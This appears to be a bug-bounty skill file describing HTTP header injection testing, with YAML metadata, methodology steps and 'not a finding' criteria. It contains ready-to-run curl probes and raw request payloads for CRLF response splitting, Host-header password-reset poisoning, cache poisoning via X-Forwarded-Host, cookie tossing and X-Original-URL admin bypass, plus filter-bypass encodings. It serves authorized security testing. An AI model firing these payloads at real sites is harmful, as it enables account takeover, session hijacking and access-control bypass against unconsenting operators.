---
name: "http-header-injection"
version: "2.0"
category: "api"
subcategory: "injection"
phase: "exploitation"
tags: ["api", "bug-bounty", "cache-poisoning", "crlf", "header-injection", "host-header", "injection", "response-splitting", "access-control", "account-takeover", "auth", "authorization", "bypass", "cloud", "cors", "exploitation", "fuzzing", "graphql", "idor", "iis", "information-disclosure", "js-recon", "mass-assignment", "mobile", "oauth", "path-traversal", "privesc", "session", "takeover", "token", "waf-bypass"]
tools: ["burp-suite", "adb", "burp", "ghauri", "sqlmap", "arjun", "authz", "autorize", "graphqlmap", "grpcurl", "john", "kiterunner", "paramalyzer", "parameth", "repeater", "restler", "zap"]
follow_up_skills: ["crlf-injection", "http-request-smuggling", "cors-misconfiguration", "xss", "cache-poisoning-deception"]
prerequisite_skills: ["crlf-injection"]
description: "Bug bounty skill: http header injection - exploitation phase, api category"
---
# HTTP Header Injection

## Summary

HTTP header injection occurs when user-controlled input reaches a response header value without CR/LF normalization. Attack primitives include CRLF response splitting, cache poisoning, Host header confusion, cookie manipulation, proxy header spoofing, content-type confusion, XSS via headers, open redirect, HTTP/2 frame confusion, and request smuggling.

## Key Concepts

- **CRLF (`%0d%0a`)**: Terminates HTTP headers; double CRLF separates headers from body
- **Response Splitting**: Inject `\r\n\r\n` to end the current response and prepend an attacker-controlled second response
- **Cache Poisoning**: Input that influences the response body but not the cache key → cross-user serving of poisoned content
- **Unkeyed Input**: A request parameter or header that changes the response but is not part of the cache key
- **Host Confusion**: Backend uses `Host`/`X-Forwarded-Host` to construct absolute URLs (password reset, OAuth redirects)
- **Cookie Tossing**: Injecting a cookie with the same name as a real session cookie but broader scope — attacker's cookie shadows the legitimate one
- **X-Original-URL / X-Rewrite-URL**: IIS/ASP.NET headers for server-side URL rewriting after auth — classic admin auth bypass
- **obs-fold**: RFC 7230 obsolete header folding — continuation lines starting with whitespace accepted by some parsers

## Technical Details

### High-Value Targets

- Password-reset and account-recovery flows (Host header determines the link sent to the user)
- OAuth/SSO redirect endpoints (Location, redirect_uri echoes)
- Auth gateways trusting X-Forwarded-For/X-Real-IP for IP allowlists or rate limits
- CDN/WAF caches (poisoning a public cache with a per-user response)
- Multi-tenant routing keyed on Host or X-Tenant-Id
- File-download endpoints (Content-Disposition filename derived from user input)
- Outbound notification/email systems where user input lands in the message header

### Cache Poisoning

Unkeyed input → keyed response: input that changes the response body but not the cache key.
- **Vary manipulation**: Inject a Vary header to over-fragment or under-fragment the cache
- **X-Forwarded-Proto/Host poisoning**: Backend uses these to build canonical URLs; CDN caches with attacker-controlled links
- **Cache-Control injection**: Flip `private` to `public`, inject `max-age=999999` for persistence, or `max-age=0`/`no-cache` to flush
- **Web cache deception**: Trick cache into storing an authenticated response at a public-looking URL by appending a cacheable extension

### Cookie/Set-Cookie Manipulation

- Inject `Domain=.example.com` or `Path=/` to widen scope of an attacker-set cookie
- Inject `SameSite=None; Secure` to allow cross-site inclusion
- Inject `Max-Age=999999999` for persistence, or `Max-Age=-1` to nuke the victim's session
- Cookie tossing: inject a cookie with the same name as a real session cookie — precedence rules let a same-domain attacker shadow it
- Reflected cookie XSS: cookie value later rendered unescaped in HTML

### Content-Type / Encoding Confusion

- Inject `Content-Type: text/html` into JSON endpoint → browser may sniff and render → XSS
- Inject `charset=utf-7` for legacy XSS via UTF-7-encoded payloads
- Inject `Content-Disposition: inline` to switch a download into in-page rendering
- Inject `Content-Encoding: gzip` without actually compressing — clients decode-fail and may reveal raw bytes in error paths

### XSS via Response Headers

- `Location: javascript:alert(1)` — most modern browsers block, but some legacy clients/Electron hosts don't
- `Location: data:text/html,<script>alert(1)</script>` — same caveat
- `Refresh: 0; url=javascript:alert(1)` — JavaScript-free meta-refresh equivalent, commonly missed
- Reflected request header XSS: Referer echoed into a custom error page, User-Agent echoed into a debug header

### Open Redirect via Headers

- `Refresh: 0; url=https://attacker.tld` — bypasses some Location-only filters
- `Link: <https://attacker.tld>; rel="canonical"` — consumed by SEO tooling
- `X-Accel-Redirect: /internal/file` (Nginx) — if user input reaches this, internal-only files become accessible

### HTTP/2 Pseudo-Header Confusion

- HTTP/2 pseudo-headers (`:method`, `:path`, `:authority`, `:scheme`) — servers downgrading to HTTP/1.1 sometimes mishandle values, enabling smuggling across H2→H1 boundary
- HTTP/2 lowercases header names — an upstream H1 filter that's case-sensitive may miss a lowercase variant that the H2 backend accepts
- HEADERS/CONTINUATION frame splitting — payload spans frames; intermediaries differ on reassembly

## Methodology

1. Enumerate every response header whose value moves with input — flip query/body/cookie values and diff Set-Cookie, Location, Content-Type, Content-Disposition, ETag, Vary, custom X-* headers.
2. For each varying header, identify the source field — user-controlled vs server-derived.
3. Probe CR/LF normalization — inject `%0d%0a` (and encoding variants: `%0a`, `%0d`, `%250d%250a`, overlong UTF-8) into each varying header source; observe whether the second line lands as a real header.
4. Test Host/X-Forwarded-Host — submit a password-reset or any link-generating flow with attacker-controlled Host; confirm the link in the response or follow-up email.
5. Probe forwarding headers — spoof X-Forwarded-For, X-Real-IP, True-Client-IP, CF-Connecting-IP against IP-restricted endpoints.
6. Test cache key/response content split — find inputs that change the body but not the cache key; confirm a second request from a different session sees the poisoned response.
7. Test method override — X-HTTP-Method-Override paired with state-changing endpoints.
8. Test request smuggling pairs — conflicting Content-Length and Transfer-Encoding, two Content-Length headers, malformed chunked encoding, against frontend→backend pairs.
9. Test cookie manipulation — inject Domain, Path, SameSite, Max-Age into Set-Cookie to widen scope or persist.
10. Cross-protocol — replay payloads over HTTP/1.1 and HTTP/2; diff behavior.
11. Test X-Original-URL / X-Rewrite-URL against IIS/ASP.NET admin endpoints for auth bypass.
12. Fingerprint the stack — Server, Via, X-Powered-By, X-AspNet-Version, X-Served-By, CF-Ray, X-Amzn-RequestId reveal the technology.

## Detection Commands

### CRLF injection probe (response splitting)
```bash
curl -s --path-as-is "https://target.com/redirect?to=foo%0d%0aSet-Cookie:%20admin=1%0d%0a%0d%0a<html>poisoned</html>" -o /dev/null -w "%{http_code}"
```

### CRLF encoding variants
```bash
curl -s --path-as-is "https://target.com/page?q=test%0d%0aX-Injected:%20yes"
curl -s --path-as-is "https://target.com/page?q=test%0aX-Injected:%20yes"
curl -s --path-as-is "https://target.com/page?q=test%250d%250aX-Injected:%20yes"
```

### Host header manipulation
```bash
curl -s -H "Host: attacker.tld" "https://target.com/api/user/profile" | head -20
curl -s -H "X-Forwarded-Host: attacker.tld" "https://target.com/password-reset" | head -20
```

### Forwarding header spoofing
```bash
curl -s -H "X-Forwarded-For: 127.0.0.1" "https://target.com/admin"
curl -s -H "X-Real-IP: 127.0.0.1" "https://target.com/admin"
curl -s -H "CF-Connecting-IP: 127.0.0.1" "https://target.com/admin"
```

### Cookie manipulation
```bash
curl -s -H "Set-Cookie: session=abcd; Domain=.target.com; Path=/; Max-Age=999999999" "https://target.com/page"
```

### Content-Type confusion
```bash
curl -s -H "Content-Type: text/html" "https://target.com/api/data"
curl -s -H "Content-Type: text/html; charset=utf-7" "https://target.com/api/data"
```

### X-Original-URL bypass (IIS/ASP.NET)
```bash
curl -s -H "X-Original-URL: /admin/panel" "https://target.com/"
curl -s -H "X-Rewrite-URL: /admin/panel" "https://target.com/"
```

### X-HTTP-Method-Override
```bash
curl -s -H "X-HTTP-Method-Override: DELETE" -X POST "https://target.com/api/resource"
curl -s -H "X-HTTP-Method-Override: PUT" -X POST "https://target.com/api/resource"
```

### Cache poisoning probe
```bash
# Send request with unkeyed input
curl -s -H "X-Forwarded-Host: attacker.tld" "https://target.com/page"
# Verify from second session
curl -s "https://target.com/page"
```

### X-Accel-Redirect (Nginx internal redirect)
```bash
curl -s -H "X-Accel-Redirect: /internal/secret" "https://target.com/"
```

### Refresh header open redirect
```bash
curl -s --path-as-is "https://target.com/page?url=%30%3Burl%3Dhttps%3A%2F%2Fattacker.tld"
```

## Exploitation Payloads

### CRLF → response splitting
```
GET /redirect?to=foo%0d%0aSet-Cookie:%20admin=1%0d%0a%0d%0a<html>poisoned</html> HTTP/1.1
```

### Host → password reset poisoning
```
POST /password-reset HTTP/1.1
Host: attacker.tld
```

### Cookie tossing
```http
Set-Cookie: session=attacker_session; Domain=.target.com; Path=/
```

### Cache poisoning via X-Forwarded-Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.tld
```

## Bypass Techniques

- **CRLF Encoding**: URL-encode (`%0d%0a`), double-encode (`%250d%250a`), bare LF (`%0a`), bare CR (`%0d`), mix case (`%0d%0A`), Unicode line separators (U+2028, U+2029), overlong UTF-8 of CR/LF
- **Header Normalization Edges**: Leading/trailing whitespace, tabs, obs-fold (continuation lines), duplicate headers (pick first/last/differ)
- **Method Override**: X-HTTP-Method-Override, X-Method-Override, X-HTTP-Method to reach state-changing handlers
- **Header Name Games**: Case mangling for exact-case filters; null byte truncation (`X-Forwarded-For\x00Evil`)
- **Cross-Protocol**: Replay payloads over HTTP/1.1 and HTTP/2; diff behavior
- **X-Forwarded-* Spray**: X-Forwarded-For, X-Real-IP, True-Client-IP, CF-Connecting-IP, Client-IP, X-Original-URL, X-Rewrite-URL, Forwarded (RFC 7239)

## Not a Finding If

- Headers that vary by input but are correctly keyed in the cache (intentional personalization, Vary set correctly)
- X-Forwarded-* reflected back but only used for logging — not a security boundary
- Browsers blocking `Location: javascript:` or `Location: data:` — protocol allows it but modern clients refuse
- CRLF appearing in response headers but stripped by an outer proxy before reaching any client or cache
- Request smuggling indicators that turn out to be normal pipelining or keep-alive behavior
- Content-Type injection that doesn't actually change how the browser processes the response

## Notes

- The fastest win is usually Host/X-Forwarded-Host in a password-reset or OAuth flow — try first, costs one request
- For cache poisoning, find the unkeyed input first (header that influences body but not cache key); the rest follows
- X-HTTP-Method-Override is high-yield against backends that route on it before checking method-based auth
- Smuggling lives at the boundary — identify the proxy→backend pair and target the framing disagreement
- X-Original-URL / X-Rewrite-URL against IIS/ASP.NET admin endpoints is still a high-yield bypass
- Before claiming a CRLF win, verify the second line landed as a real header in the cache or downstream consumer
- Outbound email flows are a related surface — user input flowing into SMTP headers (To, Cc, Subject, Reply-To)
- Treat every X-Forwarded-* / Host trust as a security boundary that needs explicit justification

## References

- https://portswigger.net/web-security/request-smuggling
- https://portswigger.net/web-security/host-header
- https://portswigger.net/web-security/cache-poisoning
- https://portswigger.net/research/http2
